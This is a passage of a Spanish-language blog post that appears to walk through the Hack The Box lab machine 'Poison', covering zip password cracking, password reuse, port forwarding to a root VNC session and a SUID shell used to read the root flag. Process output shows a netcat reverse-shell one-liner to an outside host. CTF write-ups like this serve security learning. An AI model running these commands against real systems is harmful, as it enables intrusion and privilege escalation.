2018-01-24 11:01:14 .R..A            8           20  secret
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2018-01-24 11:01:14                  8           20  1 files
</code></pre></div></div>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">unzip</code> nos pide contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip secret.zip
Archive:  secret.zip
<span class="o">[</span>secret.zip] secret password: 
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code> para extraer un hash y posteriormente crackearlo para obtener la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john secret.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 secret.zip/secret PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>20, <span class="nv">decmplen</span><span class="o">=</span>8, <span class="nv">crc</span><span class="o">=</span>77537827 <span class="nv">ts</span><span class="o">=</span>9827 <span class="nv">cs</span><span class="o">=</span>7753 <span class="nb">type</span><span class="o">=</span>0
</code></pre></div></div>

<ul>
  <li>Y bueno no tenemos suerte por que no esta la contraseña en el <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:12 DONE <span class="o">(</span>2024-09-08 13:06<span class="o">)</span> 0g/s 1188Kp/s 1188Kc/s 1188KC/s <span class="o">!</span>LUVDKR!..<span class="k">*</span>7¡Vamos!
Session completed. 
                            
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es reutilizar la contraseña que ya tenemos para ver si con esa funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip secret.zip
Archive:  secret.zip
<span class="o">[</span>secret.zip] secret password: 
 extracting: secret    
</code></pre></div></div>

<ul>
  <li>Pero no vemos gran cosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn secret
��[|Ֆz!
</code></pre></div></div>

<ul>
  <li>Si enumeramos puertos abiertos internamente vemos los siguientes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % netstat <span class="nt">-na</span> <span class="nt">-p</span> tcp
Active Internet connections <span class="o">(</span>including servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address          Foreign Address        <span class="o">(</span>state<span class="o">)</span>
tcp4       0     44 10.10.10.84.22         10.10.14.17.57266      ESTABLISHED
tcp4       0      0 10.10.10.84.13393      10.10.14.17.443        CLOSE_WAIT
tcp4       0      0 10.10.10.84.80         10.10.14.17.52658      CLOSE_WAIT
tcp4       0      0 127.0.0.1.25           <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0 <span class="k">*</span>.80                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp6       0      0 <span class="k">*</span>.22                   <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 127.0.0.1.5801         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp4       0      0 127.0.0.1.5901         <span class="k">*</span>.<span class="k">*</span>                    LISTEN
charix@Poison:~ % 
</code></pre></div></div>

<ul>
  <li>Encontramos un proceso interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % ps <span class="nt">-faux</span>
USER   PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
root    11 100.0  0.0      0    16  -  RL   19:54   72:52.21 <span class="o">[</span>idle]
root     0   0.0  0.0      0   160  -  DLs  19:54    0:00.01 <span class="o">[</span>kernel]
root     1   0.0  0.1   5408  1040  -  ILs  19:54    0:00.00 /sbin/init <span class="nt">--</span>
root     2   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>crypto]
root     3   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>crypto returns]
root     4   0.0  0.0      0    32  -  DL   19:54    0:00.04 <span class="o">[</span>cam]
root     5   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>mpt_recovery0]
root     6   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>sctp_iterator]
root     7   0.0  0.0      0    16  -  DL   19:54    0:00.25 <span class="o">[</span>rand_harvestq]
root     8   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod1]
root     9   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod2]
root    10   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>audit]
root    12   0.0  0.1      0   736  -  WL   19:54    0:01.65 <span class="o">[</span>intr]
root    13   0.0  0.0      0    48  -  DL   19:54    0:00.00 <span class="o">[</span>geom]
root    14   0.0  0.0      0   160  -  DL   19:54    0:00.15 <span class="o">[</span>usb]
root    15   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod3]
root    16   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>soaiod4]
root    17   0.0  0.0      0    48  -  DL   19:54    0:00.07 <span class="o">[</span>pagedaemon]
root    18   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>vmdaemon]
root    19   0.0  0.0      0    16  -  DL   19:54    0:00.00 <span class="o">[</span>pagezero]
root    20   0.0  0.0      0    32  -  DL   19:54    0:00.04 <span class="o">[</span>bufdaemon]
root    21   0.0  0.0      0    16  -  DL   19:54    0:00.01 <span class="o">[</span>bufspacedaemon]
root    22   0.0  0.0      0    16  -  DL   19:54    0:00.04 <span class="o">[</span>syncer]
root    23   0.0  0.0      0    16  -  DL   19:54    0:00.01 <span class="o">[</span>vnlru]
root   319   0.0  0.5   9560  5052  -  Ss   19:55    0:00.15 /sbin/devd
root   390   0.0  0.2  10500  2452  -  Ss   19:55    0:00.06 /usr/sbin/syslogd <span class="nt">-s</span>
root   543   0.0  0.5  56320  5400  -  S    19:55    0:01.97 /usr/local/bin/vmtoolsd <span class="nt">-c</span> /usr/local/share/vmware-tools/tools.con
root   620   0.0  0.7  57812  7052  -  Is   19:55    0:00.00 /usr/sbin/sshd
root   625   0.0  1.1  99172 11516  -  Ss   19:56    0:00.09 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    637   0.0  1.3 101220 12776  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    638   0.0  1.2 101220 12072  -  I    19:57    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    639   0.0  1.2 101220 11952  -  I    19:57    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    640   0.0  1.3 101220 12788  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    641   0.0  1.3 101220 12812  -  I    19:57    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
root   642   0.0  0.6  20636  6140  -  Ss   19:57    0:00.05 sendmail: accepting connections <span class="o">(</span>sendmail<span class="o">)</span>
smmsp  645   0.0  0.6  20636  5808  -  Is   19:57    0:00.00 sendmail: Queue runner@00:30:00 <span class="k">for</span> /var/spool/clientmqueue <span class="o">(</span>sendm
root   649   0.0  0.2  12592  2436  -  Is   19:57    0:00.01 /usr/sbin/cron <span class="nt">-s</span>
www    706   0.0  1.2 101220 11952  -  I    19:59    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    708   0.0  1.2 101220 11988  -  S    19:59    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    712   0.0  1.3 101220 12792  -  I    19:59    0:00.02 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    713   0.0  1.2 101220 12140  -  I    19:59    0:00.01 /usr/local/sbin/httpd <span class="nt">-DNOHTTPACCEPT</span>
www    783   0.0  0.3  13180  2664  -  I    20:46    0:00.00 sh <span class="nt">-c</span> <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.
www    786   0.0  0.2   8324  1932  -  I    20:46    0:00.00 <span class="nb">cat</span> /tmp/f
www    787   0.0  0.3  13180  2680  -  I    20:46    0:00.00 /bin/sh <span class="nt">-i</span>
www    788   0.0  0.2  10928  2000  -  I    20:46    0:00.00 nc 10.10.14.17 443
root   807   0.0  0.8  85228  7840  -  Is   20:56    0:00.01 sshd: charix <span class="o">[</span>priv] <span class="o">(</span>sshd<span class="o">)</span>
charix 810   0.0  0.8  85228  7872  -  S    20:56    0:00.01 sshd: charix@pts/1 <span class="o">(</span>sshd<span class="o">)</span>
root   529   0.0  0.9  23620  8868 v0- I    19:55    0:00.02 Xvnc :1 <span class="nt">-desktop</span> X <span class="nt">-httpd</span> /usr/local/share/tightvnc/classes <span class="nt">-auth</span> 
root   540   0.0  0.7  67220  7056 v0- I    19:55    0:00.01 xterm <span class="nt">-geometry</span> 80x24+10+10 <span class="nt">-ls</span> <span class="nt">-title</span> X Desktop
root   541   0.0  0.5  37620  5312 v0- I    19:55    0:00.00 twm
root   696   0.0  0.2  10484  2076 v0  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv0
root   697   0.0  0.2  10484  2076 v1  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv1
root   698   0.0  0.2  10484  2076 v2  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv2
root   699   0.0  0.2  10484  2076 v3  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv3
root   700   0.0  0.2  10484  2076 v4  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv4
root   701   0.0  0.2  10484  2076 v5  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv5
root   702   0.0  0.2  10484  2076 v6  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv6
root   703   0.0  0.2  10484  2076 v7  Is+  19:57    0:00.00 /usr/libexec/getty Pc ttyv7
root   617   0.0  0.4  19660  3616  0  Is+  19:55    0:00.00 <span class="nt">-csh</span> <span class="o">(</span>csh<span class="o">)</span>
charix 811   0.0  0.4  19660  3796  1  Ss   20:56    0:00.01 <span class="nt">-csh</span> <span class="o">(</span>csh<span class="o">)</span>
charix 837   0.0  0.3  21208  2660  1  R+   21:07    0:00.00 ps <span class="nt">-faux</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que se esta corriendo <code class="language-plaintext highlighter-rouge">tightvnc</code> ya que el usuario root lo esta corriendo <a href="https://www.tightvnc.com/">https://www.tightvnc.com/</a>.</p>
  </li>
  <li>
    <p>Aquí nos explican como auditar ese servicio <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ vncviewer
</code></pre></div></div>

<ul>
  <li>Nos tenemos que conectar pero el puerto solo esta abierto internamente así que haremos <code class="language-plaintext highlighter-rouge">port forwarding</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh charix@10.10.10.84 <span class="nt">-D</span> 1080
</code></pre></div></div>

<ul>
  <li>Todo esta funcionando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ lsof <span class="nt">-i</span>:1080
COMMAND   PID        USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     62161 miguelrega7    4u  IPv6 192426      0t0  TCP localhost:socks <span class="o">(</span>LISTEN<span class="o">)</span>
ssh     62161 miguelrega7    5u  IPv4 192427      0t0  TCP localhost:socks <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos lo que nos pide la herramienta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains vncviewer 127.0.0.1:5901 <span class="nt">-passwd</span> secret
</code></pre></div></div>

<ul>
  <li>Estamos como root.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/9.png" />
</p>

<h2 id="root-flag">Root flag</h2>

<ul>
  <li>Vamos a poner la <code class="language-plaintext highlighter-rouge">sh</code> con permisos <code class="language-plaintext highlighter-rouge">SUID</code> para estar como <code class="language-plaintext highlighter-rouge">root</code> desde nuestra consola.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/poison/10.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>charix@Poison:~ % /bin/sh
Cannot <span class="nb">read </span>termcap database<span class="p">;</span>
using dumb terminal settings.
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
716d04b188419cf2bb99d891272361f5
<span class="c"># </span>
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/09/08/poison.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
